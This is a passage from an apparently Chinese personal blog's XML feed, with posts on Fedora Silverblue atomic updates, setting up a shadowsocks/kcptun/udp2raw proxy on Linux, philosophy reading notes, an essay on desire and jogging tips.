<li>在言词或者表情流露出愤怒或憎恨是徒劳无益的，既不智和危险，又可笑和流于俗套。所以，除了通过行动，我们永远不要以任何其他方式表现憎恨或愤怒。我们越能避免在话语和表情上表示愤怒，就越能以行动表现出来。冷血的动物才是唯一有毒的动物。</li>
<li>一个古老的作家相当确切、中肯地说过，在这世上存在三种力:精明、力量和时运。我相信时运至为重要。这是因为我们的一-生可比之于一条船的航程。 时运一-顺运或者逆运一 扮演着风的角色， 它可以迅速推前我们的航程，也可以把我们抛后老远的距离。对此，我们的努力和奋斗作用不大。也就是说，我们的努力和奋斗只是发挥桨橹的作用:在竭尽全力挥舞桨橹数小时以后，终于向前走了一程，这时突如其来的一阵强风， 一下子就能使我们倒退同样的距离。如果风向顺利，我们不需划桨也会前行。一西班牙谚语就很美妙地表达了命运的强大力量: 祝你儿子好运，然后把他抛进大海吧!</li>
</ul>
]]></content>
      <categories>
        <category>阅读</category>
      </categories>
      <tags>
        <tag>读书有感</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux技术分享】原子更新调研分析（一）Fedora-Silverblue初窥</title>
    <url>/2022/09/04/%E5%8E%9F%E5%AD%90%E6%9B%B4%E6%96%B0%E8%B0%83%E7%A0%94%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89Fedora-Silverblue%E5%88%9D%E7%AA%A5/</url>
    <content><![CDATA[<h1 id="原子更新调研分析（一）Fedora-Silverblue初窥"><a href="#原子更新调研分析（一）Fedora-Silverblue初窥" class="headerlink" title="原子更新调研分析（一）Fedora-Silverblue初窥"></a>原子更新调研分析（一）Fedora-Silverblue初窥</h1><p><em><strong>最近很大一部分时间都在开发deepin的原子更新，在闲暇时关注下其他的os原子更新的实现，从而查漏补缺完善自身的不足，本文为Fedora-Silverblue OS自身的原子更新一个大致框架介绍。</strong></em></p>
<span id="more"></span>

<h2 id="本文适读人群"><a href="#本文适读人群" class="headerlink" title="本文适读人群"></a>本文适读人群</h2><ol>
<li>对linux系统启动流程有基本认知</li>
<li>有过linux系统开发基本常识，了解sh脚本</li>
</ol>
<h2 id="本文能够知道什么"><a href="#本文能够知道什么" class="headerlink" title="本文能够知道什么"></a>本文能够知道什么</h2><ol>
<li>Fedora-Silverblue OS原子更新应用安装到启动基本流程介绍</li>
</ol>
<h2 id="本文不知道什么"><a href="#本文不知道什么" class="headerlink" title="本文不知道什么"></a>本文不知道什么</h2><ol>
<li>rpm-ostree原理及其在os使用</li>
<li>Fedora-Silverblue OS版本清除</li>
</ol>
<h2 id="前提概要"><a href="#前提概要" class="headerlink" title="前提概要"></a>前提概要</h2><ol>
<li><p>Fedora-Silverblue OS原子更新优势是什么？<br>详细的可以看下这篇文章，里面有详细介绍其原子更新的优势以及其特点，<a href="https://www.linkedin.com/pulse/never-worry-updates-again-ostree-zincati-kelvin-yao-fan/">Never Worry about Updates Again with OSTree and Zincati</a>。这里我大致讲一下，系统在更新时若由于应用不稳定或系统基础组件不稳定导致无法启动，可以还原至更新前的节点，原子意思为本次操作为完整并不可切分，通过原子化更新可以随时切回更新前节点。</p>
</li>
<li><p>rpm-ostree是什么<br>ostree为本地部署仓库，类似与git,但ostree针对的是本地的文件，用户可以在本地初始化仓库并将系统文件提交至此仓库中，提交过程中ostree会对提交文件进行分析，进行增量备份从而节省空间。rpm为linux系统下软件包管理工具。rpm与ostree进行结合则可以做到对每一次应用的修改都可以将其备份。详细内容见<a href="https://coreos.github.io/rpm-ostree/">rpm-ostree</a>。</p>
</li>
</ol>
<h2 id="框架介绍"><a href="#框架介绍" class="headerlink" title="框架介绍"></a>框架介绍</h2><ol>
<li><p>系统的<code>/boot</code>目录下存有多个initrd,若两者为相同md5值则为硬链接，系统的<code>/boot</code>，<code>/var</code>目录为单独挂载<br><img src="/2022/09/04/%E5%8E%9F%E5%AD%90%E6%9B%B4%E6%96%B0%E8%B0%83%E7%A0%94%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89Fedora-Silverblue%E5%88%9D%E7%AA%A5/1.png" alt="图1"></p>
<ul>
<li>/boot为启动分区，在系统备份时，会将备份的initrd存放至/boot分区中，并且备份的initrd无任何改变时为了节省空间会将其硬链接。</li>
</ul>
</li>
<li><p>Fedora-Silverblue利用rpm-ostree命令将其安装至系统中，但此次安装时安装时并不会立即生效，Fedora-Silverblue将系统的根分区挂载为只读，本次安装无法将应用释放至系统根目录中。<br><img src="/2022/09/04/%E5%8E%9F%E5%AD%90%E6%9B%B4%E6%96%B0%E8%B0%83%E7%A0%94%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89Fedora-Silverblue%E5%88%9D%E7%AA%A5/2.png" alt="图2"></p>
</li>
<li><p>本次系统应用安装时，会将对本次安装的所有应用进行提交，包括其依赖的文件。<br><img src="/2022/09/04/%E5%8E%9F%E5%AD%90%E6%9B%B4%E6%96%B0%E8%B0%83%E7%A0%94%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89Fedora-Silverblue%E5%88%9D%E7%AA%A5/3.png" alt="图3"></p>
</li>
<li><p>linux系统通过指定目标目录组成，系统在应用安装时，会对本地系统进行硬链接组成<code>sysroot</code>文件夹，此文件夹内容为当前系统以及本次安装的应用。<br><img src="/2022/09/04/%E5%8E%9F%E5%AD%90%E6%9B%B4%E6%96%B0%E8%B0%83%E7%A0%94%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89Fedora-Silverblue%E5%88%9D%E7%AA%A5/4.png" alt="图4"></p>
</li>
<li><p>通过设置<code>/boot/grub2/grubenv</code>的环境变量来修改本机<code>grub</code>等待时间，在下次系统启动时，不等待grub界面直接启动系统，从而保护系统启动的安全性。<br><img src="/2022/09/04/%E5%8E%9F%E5%AD%90%E6%9B%B4%E6%96%B0%E8%B0%83%E7%A0%94%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89Fedora-Silverblue%E5%88%9D%E7%AA%A5/5.png" alt="图5"></p>
</li>
<li><p>目前我们拥有了一个新的系统目录<code>sysroot</code>，os通过<code>Dracut</code>工具，可以指定<code>sysroot</code>启动本机系统详细见官方文档<code>https://man7.org/linux/man-pages/man8/dracut.8.html</code>，在启动后/sysroot进入系统后中其中文件会被清空。</p>
</li>
</ol>
<h2 id="os原子更新优劣分析"><a href="#os原子更新优劣分析" class="headerlink" title="os原子更新优劣分析"></a>os原子更新优劣分析</h2><ul>
<li><p>优点：</p>
<ul>
<li>os的根只读可以保护根系统不被破坏</li>
</ul>
</li>
<li><p>缺点</p>
<ul>
<li>用户无法对本次安装的应用直接使用，必须重启才能生效。</li>
<li>分区的固定性，对多种分区格式支持不太友好。</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>原子更新</category>
      </categories>
      <tags>
        <tag>Linux技术分享</tag>
      </tags>
  </entry>
  <entry>
    <title>【读书有感】读《哲学故事》</title>
    <url>/2022/07/31/%E8%AF%BB%E5%93%B2%E5%AD%A6%E7%9A%84%E6%95%85%E4%BA%8B/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><em><strong>《哲学故事》 非常难得的一本幽默诙谐又带有科普性质的哲学书籍。</strong></em></p>
<span id="more"></span>

<p>每次我看哲学书籍时就想到一句俚语，“人类一思考，上帝就发笑”，思考的价值是什么呢？哲学需要解决的问题是什么呢？我暂且想不出思考的价值，但哲学需要解决的问题大抵是“平衡”两个字就可以概括，平衡多元化的思想，让社会处于稳定而又朝气蓬勃的状态，有矛盾但不激化，有真理的存在但不笃定，时刻保持怀疑。</p>
<p>从自然界的角度来看，人类属于自然界的一个物种，他的自我感受基本都是来自与本能，就像幸福与痛苦是朋友一样，受与五体之困，倘若你是一名严重的鼻炎患者，那么正常的呼吸，睡眠普通人触手可及的东西就是你的渴望，基督教与佛教根本思想都是悲观主义，人生下有罪，在生活中不断的救赎自己。</p>
<h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><ul>
<li>我知道获得荣誉和财富有很多好处，但是如果我想认真的研究新事物的话，我应该停止追求这些。一般的，一个人拥有这两样东西越多，快乐感越多，也就越想进一步增加他们。任何时候如果我们的愿望遭受了挫折，我们也会遭受极大的痛苦。名誉也一样：如果我们盲目的追求欲望，那我们必须调整我们生活的方向，取悦别人，不能惹人讨厌，还要揣摩别人喜欢什么。但是对一件永恒且无穷的事物的热爱能使我们思想享受愉悦，避免所有的痛苦。</li>
<li>同一天，我和他的邻居，一个老妇人聊天，我问地，是不是因为无法知道灵魂如何产生而每天不开心。她甚至无法理解我的问题，她一生中甚至连秒钟都没有想过这样的问题，而那位善良的婆罗门长老却不断自我折磨。她内心深处相信守护神的化身，如果她能够得到恒河的圣水洗礼沐浴，她就认为自己是最幸福的女人。我为这个可怜人的幸福感到惊讶。我回到哲学家那里，我说:“离你不到五十码的地方，一位老妇人什么都不想而活得很快乐，你不为你如此痛苦而羞愧吗?“，他答道:“你说得对，我对我自己说了一千遍了，如果我能和那个老邻居一样无知，我应该也很快乐。但是那并不是我想要的快乐“。</li>
<li>人生是不幸的，因为痛苦是人生最基本的刺激与实在，而愉悦是痛苦的片段，其作用是消极的。亚里士多德说的对，智者不追求愉悦，他们在忧虑与痛苦中追寻自由。</li>
<li>不论婚前还是婚后，我们都不幸福:不论独处还是群居，我们都不快乐。我们就像一群为了抵御严寒而聚在一一起的刺猬，靠得近了，不舒服，离得远了，又冷得刺骨。人生真是有趣!“ 如果我们纵观整个人生而且把焦点放在人生那些最显著的特征上，我们会发现人生其实就是一场悲剧，但如果我们细细观察，人生又充满了喜剧的种种特征。</li>
<li>爱远方的人，胜过爱你的邻居。</li>
<li>有一次潘格洛斯对老实人说:“在这个所有可能世界中最好的世界里，事情都是相互关联的，如果你没有被带离那座宏伟的城堡….如果你没有被送去异教审判…..如果你没有走遍美洲…如果你没有失去所有的金….你就不会在这里吃着香橼和阿月浑子果仁了。老实人回答说:“所有那些都很好， 但是我们还是去我们的园子种植吧。</li>
</ul>
<h2 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h2><p>我们应该怎么做呢？我想我们应该坚持自己的理想与追求，保持自我内心的平衡，进行适当的锻炼并保持规律的作息，让身体对外界的压力有一定的弹力，从而能进行更好的思想上的思考与精神上追求。</p>
]]></content>
      <categories>
        <category>阅读</category>
      </categories>
      <tags>
        <tag>读书有感</tag>
      </tags>
  </entry>
  <entry>
    <title>【问题解决】科学上网简单搭建</title>
    <url>/2022/07/03/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="linux下科学上网简单搭建"><a href="#linux下科学上网简单搭建" class="headerlink" title="linux下科学上网简单搭建"></a>linux下科学上网简单搭建</h1><p><em><strong>linux下利用shadowsock+kcptun+udp2raw的科学上网搭建。</strong></em></p>
<span id="more"></span>
<h2 id="本文适读人群"><a href="#本文适读人群" class="headerlink" title="本文适读人群"></a>本文适读人群</h2><ol>
<li>对linux服务有简单了解</li>
<li>对科学上网稳定性有强迫，在使用shadowsock+kcptun+udp2raw会让科学上网非常稳定不容易掉包</li>
</ol>
<h2 id="本文能够知道什么"><a href="#本文能够知道什么" class="headerlink" title="本文能够知道什么"></a>本文能够知道什么</h2><ol>
<li>linux下成功使用shadowsock+kcptun+udp2raw搭建科学上网</li>
</ol>
<h2 id="本文不知道什么"><a href="#本文不知道什么" class="headerlink" title="本文不知道什么"></a>本文不知道什么</h2><ol>
<li>搭建工具原理</li>
</ol>
<h2 id="VPS购买"><a href="#VPS购买" class="headerlink" title="VPS购买"></a>VPS购买</h2><ol>
<li>我买的是<a href="https://m.do.co/c/417ce18c978d/">digitalocean</a>价格在5刀一个月偏贵，只要是国外服务器就行。</li>
</ol>
<h2 id="shadowsock搭建"><a href="#shadowsock搭建" class="headerlink" title="shadowsock搭建"></a>shadowsock搭建</h2><ol>
<li><p>下载shadowsock已发布的版本<code>https://github.com/shadowsocks/shadowsocks-rust/releases</code>，找一个最新版本下载即可，或者用命令<code> wget https://github.com/shadowsocks/shadowsocks-rust/releases/download/v1.6.10/shadowsocks-v1.6.10-release.x86_64-unknown-linux-musl.tar.xz</code>即可下载至本地;</p>
</li>
<li><p>本地压缩包解压后我们要使用的有两个文件，ssserver：shadowsock的服务端，sslocal：shadowsock的客户端;</p>
<h3 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h3></li>
<li><p>将<code>sslocal</code>二进制拷贝至<code>/usr/local/bin/</code>下</p>
<blockquote>
<p>sudo cp sslocal /usr/local/bin</p>
</blockquote>
</li>
<li><p>创建配置文件</p>
<blockquote>
<p>sudo vim /etc/shadowsocks.json</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;server&quot;:&quot;127.0.0.1&quot;,</span><br><span class="line">    &quot;server_port&quot;:30001,</span><br><span class="line">    &quot;local_address&quot;:&quot;127.0.0.1&quot;,</span><br><span class="line">    &quot;local_port&quot;:9872,</span><br><span class="line">    &quot;password&quot;:&quot;rtqqer190&quot;,</span><br><span class="line">    &quot;timeout&quot;:300,</span><br><span class="line">    &quot;method&quot;:&quot;aes-256-gcm&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>创建开机启动服务</p>
<blockquote>
<p>sudo vim /lib/systemd/system/ss-server.service</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description&#x3D;shadowsocks server daemon</span><br><span class="line">After&#x3D;syslog.target network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type&#x3D;simple</span><br><span class="line"># 关键就是这行，确定我们的程序文件，以及配置文件的路径</span><br><span class="line">ExecStart&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;sslocal -c &#x2F;etc&#x2F;shadowsocks.json</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br></pre></td></tr></table></figure></li>
<li><p>启动服务并设置开机启动</p>
<blockquote>
<p>systemctl start ss-server.service<br>systemctl enable ss-server.service</p>
</blockquote>
</li>
</ol>
<h3 id="服务端配置"><a href="#服务端配置" class="headerlink" title="服务端配置"></a>服务端配置</h3><ol>
<li>将<code>ssserver</code>二进制拷贝至<code>/usr/local/bin/</code>下<blockquote>
<p>sudo cp ssserver /usr/local/bin</p>
</blockquote>
</li>
<li>创建配置文件<blockquote>
<p>sudo vim /etc/shadowsocks.json</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;server&quot;:&quot;::&quot;,</span><br><span class="line">    &quot;server_port&quot;:39201,</span><br><span class="line">    &quot;local_address&quot;: &quot;127.0.0.1&quot;,</span><br><span class="line">    &quot;local_port&quot;:1080,</span><br><span class="line">    &quot;password&quot;:&quot;rtqqer190&quot;,</span><br><span class="line">    &quot;timeout&quot;:300,</span><br><span class="line">    &quot;method&quot;:&quot;aes-256-gcm&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>创建开机启动服务<blockquote>
<p>sudo vim /lib/systemd/system/ss-server.service</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description&#x3D;shadowsocks server daemon</span><br><span class="line">After&#x3D;syslog.target network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line"># 关键就是这行，确定我们的程序文件，以及配置文件的路径</span><br><span class="line">ExecStart&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;ssserver -c &#x2F;etc&#x2F;shadowsocks.json</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br></pre></td></tr></table></figure></li>
<li>启动服务并设置开机启动<blockquote>
<p>systemctl start ss-server.service<br>systemctl enable ss-server.service</p>
</blockquote>
</li>
</ol>
<h2 id="kcptun搭建"><a href="#kcptun搭建" class="headerlink" title="kcptun搭建"></a>kcptun搭建</h2><ol>
<li><p>下载kcptun已发布的版本<code>https://github.com/xtaci/kcptun/releases</code>，找一个最新版本下载即可，或者用命令<code>wget https://github.com/xtaci/kcptun/releases/download/v20220628/kcptun-linux-amd64-20220628.tar.gz</code>即可下载至本地;</p>
</li>
<li><p>本地压缩包解压后我们要使用的有两个文件，server_linux_amd64：kcptun的服务端，client_linux_amd64：kcptun的客户端;</p>
<h3 id="客户端配置-1"><a href="#客户端配置-1" class="headerlink" title="客户端配置"></a>客户端配置</h3></li>
<li><p>将<code>client_linux_amd64</code>二进制拷贝至<code>/usr/local/bin/</code>下</p>
<blockquote>
<p>sudo cp client_linux_amd64 /usr/local/bin</p>
</blockquote>
</li>
<li><p>创建开机启动服务</p>
<blockquote>
<p>sudo vim /lib/systemd/system/kcptun.service</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description&#x3D;kcptun-server Service</span><br><span class="line">After&#x3D;network.target</span><br><span class="line">Wants&#x3D;network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type&#x3D;simple</span><br><span class="line">PIDFile&#x3D;&#x2F;var&#x2F;run&#x2F;kcp-server.pid</span><br><span class="line"># 重要的就是下面的这句话</span><br><span class="line">ExecStart&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;client_linux_amd64 -l :30001 -r 127.0.0.1:30001 --crypt salsa20 --key &quot;lch0719&quot; --nocomp</span><br><span class="line">Restart&#x3D;on-abnormal</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br></pre></td></tr></table></figure></li>
<li><p>启动服务并设置开机启动</p>
<blockquote>
<p>systemctl start kcptun.service<br>systemctl enable kcptun.service</p>
</blockquote>
</li>
</ol>
<h3 id="服务端配置-1"><a href="#服务端配置-1" class="headerlink" title="服务端配置"></a>服务端配置</h3><ol>
<li><p>将<code>server_linux_amd64</code>二进制拷贝至<code>/usr/local/bin/</code>下</p>
<blockquote>
<p>sudo cp server_linux_amd64 /usr/local/bin</p>
</blockquote>
</li>
<li><p>创建配置文件</p>
<blockquote>
<p>sudo vim /etc/kcptun.json</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;listen&quot;:&quot;:8400&quot;,</span><br><span class="line">  &quot;target&quot;:&quot;127.0.0.1:39201&quot;,</span><br><span class="line">  &quot;crypt&quot;:&quot;salsa20&quot;,</span><br><span class="line">  &quot;mode&quot;:&quot;fast2&quot;,</span><br><span class="line">  &quot;key&quot;:&quot;lch0719&quot;,</span><br><span class="line">  &quot;nocomp&quot;:true,</span><br><span class="line">  &quot;keepalive&quot;:10,</span><br><span class="line">  &quot;nodelay&quot;:0,</span><br><span class="line">  &quot;mtu&quot;:1350,</span><br><span class="line">  &quot;dscp&quot;:0,</span><br><span class="line">  &quot;sockbuf&quot;:4194304,</span><br><span class="line">  &quot;nc&quot;:1,</span><br><span class="line">  &quot;resend&quot;:2,</span><br><span class="line">  &quot;parityshard&quot;:3,</span><br><span class="line">  &quot;rcvwnd&quot;:4096,</span><br><span class="line">  &quot;interval&quot;:20,</span><br><span class="line">  &quot;sndwnd&quot;:4096,</span><br><span class="line">  &quot;datashard&quot;:10</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>创建开机启动服务</p>
<blockquote>
<p>sudo vim /lib/systemd/system/kcptun.service</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description&#x3D;kcptun-server Service</span><br><span class="line">After&#x3D;network.target</span><br><span class="line">Wants&#x3D;network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type&#x3D;simple</span><br><span class="line">PIDFile&#x3D;&#x2F;var&#x2F;run&#x2F;kcp-server.pid</span><br><span class="line"># 重要的就是下面的这句话</span><br><span class="line">ExecStart&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;kcptun -c &#x2F;etc&#x2F;kcptun.json</span><br><span class="line">Restart&#x3D;on-abnormal</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br></pre></td></tr></table></figure></li>
<li><p>启动服务并设置开机启动</p>
<blockquote>
<p>systemctl start kcptun.service<br>systemctl enable kcptun.service</p>
</blockquote>
</li>
</ol>
<h2 id="udp2raw搭建"><a href="#udp2raw搭建" class="headerlink" title="udp2raw搭建"></a>udp2raw搭建</h2><ol>
<li><p>下载udp2raw已发布的版本<code>https://github.com/wangyu-/udp2raw-tunnel</code>，找一个最新版本下载即可;</p>
</li>
<li><p>本地压缩包解压后我们要使用指定架构版本<code>udp2raw_amd64</code>，udp2raw为服务端客户端一体;</p>
<h3 id="客户端配置-2"><a href="#客户端配置-2" class="headerlink" title="客户端配置"></a>客户端配置</h3></li>
<li><p>将<code>udp2raw_amd64</code>二进制拷贝至<code>/usr/local/bin/</code>下</p>
<blockquote>
<p>sudo cp client_linux_amd64 /usr/local/bin</p>
</blockquote>
</li>
<li><p>创建开机启动服务</p>
<blockquote>
<p>sudo vim /lib/systemd/system/udp2raw.service</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description&#x3D;udp2raw-server Service</span><br><span class="line">After&#x3D;network.target</span><br><span class="line">Wants&#x3D;network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type&#x3D;simple</span><br><span class="line">PIDFile&#x3D;&#x2F;var&#x2F;run&#x2F;kcp-server.pid</span><br><span class="line"># 重要的就是下面的这句话</span><br><span class="line">ExecStart&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;udp2raw_amd64 -c -l0.0.0.0:30001 -r &lt;服务器ip地址&gt;:&lt;服务器udp端口，比如我这里就是：4096&gt; -k &quot;lch0719&quot;</span><br><span class="line">Restart&#x3D;on-abnormal</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br></pre></td></tr></table></figure></li>
<li><p>启动服务并设置开机启动</p>
<blockquote>
<p>systemctl start udp2raw.service<br>systemctl enable udp2raw.service</p>
</blockquote>
</li>
</ol>
<h3 id="服务端配置-2"><a href="#服务端配置-2" class="headerlink" title="服务端配置"></a>服务端配置</h3><ol>
<li><p>将<code>udp2raw_amd64</code>二进制拷贝至<code>/usr/local/bin/</code>下</p>
<blockquote>
<p>sudo cp server_linux_amd64 /usr/local/bin</p>
</blockquote>
</li>
<li><p>创建开机启动服务</p>
<blockquote>
<p>sudo vim /lib/systemd/system/udp2raw.service</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description&#x3D;udp2raw-server Service</span><br><span class="line">After&#x3D;network.target</span><br><span class="line">Wants&#x3D;network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type&#x3D;simple</span><br><span class="line">PIDFile&#x3D;&#x2F;var&#x2F;run&#x2F;kcp-server.pid</span><br><span class="line"># 重要的就是下面的这句话</span><br><span class="line">ExecStart&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;udp2raw_amd64 -s -l0.0.0.0:4096 -r127.0.0.1:8400 -a -k &quot;lch0719&quot;</span><br><span class="line">Restart&#x3D;on-abnormal</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br></pre></td></tr></table></figure></li>
<li><p>启动服务并设置开机启动</p>
<blockquote>
<p>systemctl start udp2raw.service<br>systemctl enable udp2raw.service</p>
</blockquote>
</li>
</ol>
<h2 id="谷歌设置shadowsock"><a href="#谷歌设置shadowsock" class="headerlink" title="谷歌设置shadowsock"></a>谷歌设置shadowsock</h2><ol>
<li>首先下载谷歌插件<code>SwitchyOmega</code></li>
<li><code>auto switch</code>配置规则列表网址<code>https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt</code></li>
<li><code>proxy</code> 配置代理协议<code>Sock5</code>，代理服务器<code>127.0.0.1</code>，代理端口为刚才shadowsock端口<code>9872</code></li>
<li>不代理列表配置<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1</span><br><span class="line">::1</span><br><span class="line">localhost</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="终端配置科学上网"><a href="#终端配置科学上网" class="headerlink" title="终端配置科学上网"></a>终端配置科学上网</h2><blockquote>
<p>sudo apt install proxychains4<br>sudo vim /etc/proxychains4.conf<br>在[Proxylist]下增加：sock4 127.0.0.1 9872</p>
</blockquote>
]]></content>
      <categories>
        <category>问题解决</category>
      </categories>
      <tags>
        <tag>问题解决</tag>
      </tags>
  </entry>
  <entry>
    <title>【思考】浅谈欲望</title>
    <url>/2022/05/30/%E6%B5%85%E8%B0%88%E6%AC%B2%E6%9C%9B/</url>
    <content><![CDATA[<h1 id="浅谈个人欲望"><a href="#浅谈个人欲望" class="headerlink" title="浅谈个人欲望"></a>浅谈个人欲望</h1><p><strong>Don’t stretch your desire towards it, but wait till it reaches you. Do this with regard to children, to a wife, to careers, to riches, and you will eventually be a worthy partner of the feasts of the gods.</strong></p>
<span id="more"></span>

<p>最近在看西方哲学史，对自我的理解加深了一些，对于自我本身的欲望有所感慨。以下全为对自我的感慨;</p>
<h2 id="欲望的分类"><a href="#欲望的分类" class="headerlink" title="欲望的分类"></a>欲望的分类</h2><p>欲望分为本能欲望，物质欲望，思想欲望。本能欲望是指作为一碳基生物所需要的生存本能，例如我们需要呼吸，吃饭，睡觉，属于我们生活不可获取的欲望，物质欲望是指脱离了生存本能而想获取的那部分，比如高质量的生活追求，放飞自我的日程安排，思想欲望则是追求心理的平静，知识的汲取和人性的思考等等;</p>
<h2 id="通过欲望获取快乐"><a href="#通过欲望获取快乐" class="headerlink" title="通过欲望获取快乐"></a>通过欲望获取快乐</h2><p>通过欲望而获取快乐，分为三层，第一层是需求，想获取对于个人暂时无法获取的事物，从而产生了欲望，最后通过努力获取后得到物质的满足获取了快乐;第二层是克制，通过控制自我，掌握自身习惯与特性降低自身欲望，当个体长期对单一事件得不到满足就会对产生欲望，此时对欲望进行满足则会获取到快乐，第三层是无欲无求，当个体没有欲望后就不需要通过快乐进行满足自身，个人如果对生命没有渴求，自然不会畏惧死亡，没有恐惧就不会获取到快乐，但从人这个角度来看，本能的欲望很难克制，无法克制自身欲望就不能保持精神的纯洁。在对事物进行思考的时，会被肉体的饥饿，疲惫，困顿而影响，从而得不到纯粹的思想上的答案。所以西方哲学家普遍认为死亡，才能获取到精神的纯洁，才能接触到真正的智慧。</p>
<p><img src="/2022/05/30/%E6%B5%85%E8%B0%88%E6%AC%B2%E6%9C%9B/1.jpg" alt="图1"></p>
]]></content>
      <categories>
        <category>自我反思</category>
      </categories>
      <tags>
        <tag>思考</tag>
      </tags>
  </entry>
  <entry>
    <title>【运动】慢跑</title>
    <url>/2022/05/02/%E6%B5%85%E8%B0%88%E5%A6%82%E4%BD%95%E6%85%A2%E8%B7%91/</url>
    <content><![CDATA[<h1 id="浅谈如何坚持慢跑"><a href="#浅谈如何坚持慢跑" class="headerlink" title="浅谈如何坚持慢跑"></a>浅谈如何坚持慢跑</h1><span id="more"></span>

<h2 id="本人经历"><a href="#本人经历" class="headerlink" title="本人经历"></a>本人经历</h2><h3 id="高中"><a href="#高中" class="headerlink" title="高中"></a>高中</h3><p>在高中的时候注意到每天早上运动一小会，会让自己一天感觉精神充沛，所以当时在高三的每天早上会下楼围绕我们400m的操场进行慢跑6～8圈，持续20～30分钟，约莫坚持了三个月，当时身体状态较为良好，没有注意跑步姿势也没考虑很多，有多打挎就迈多大步子。</p>
<h3 id="大学"><a href="#大学" class="headerlink" title="大学"></a>大学</h3><p>但上大学的大二暑假，意识到自己这个行业是个高危行业，需要保持身体的健康，于是每天晚上进行夜跑，在4.5km左右，当时已经意识到自己身体状况大不如从前，就琢磨一套跑步小技巧，一直沿用至今，从上班这几年断断续续的跑步情况来看，小技巧对于慢跑还是很有帮助的;</p>
<ul>
<li><p>慢跑的时候首先需要考虑，运动的手段有很多，我真的需要通过慢跑这一项来减肥/维持健康/锻炼身体么？，慢跑是一个长时间的有氧运动过程，对我而言是快乐而又痛苦，能够清晰的感受到身体的每个部位的疲惫，所以在下定决心慢跑时，需要做好考虑;</p>
</li>
<li><p>需要一双专业跑鞋，如果穿板鞋or篮球鞋对于跑路来说是对自身脚的一种折磨</p>
</li>
<li><p>每当我跑步之前我会约定本次跑步的公里数，并不会规定本次跑步的时，要清晰的记住自己为何要慢跑，即使我跑步动也会把剩余公里走完;</p>
</li>
<li><p>在跑步之前会进行快走热身，在跑的前四分之一的时候，我会遵循七步一吸，七步一呼，把身体匀速拉到慢跑的节奏上;</p>
</li>
<li><p>我会对总路程进行标记，每当到四分之一，二分之一时，会对自己进行催眠告诉自己很快就要到达目的地;</p>
</li>
<li><p>在跑步的时候我会进行思考，会思考一些关于工作，生活，之类的东西，会让自己不去想为什么腿这么疲惫，为什么呼吸跟不上节奏，通常如果在思考阶段，对于我来说跑步会过的很快;</p>
</li>
<li><p>慢跑需要坚持一定的频率，比如一周要进行3次，不然你的腿会跟不上你的胃;</p>
</li>
<li><p>如果才开始慢跑，或者长时间没有慢跑，可以进行分段式跑步，在进行两公里的慢跑后，身体素质跟不上，需要将自己速度调整至快走的速度，缓过来后再进行慢跑，当然慢跑频率越高掌控节奏越好就不会存在此问题了;</p>
</li>
</ul>
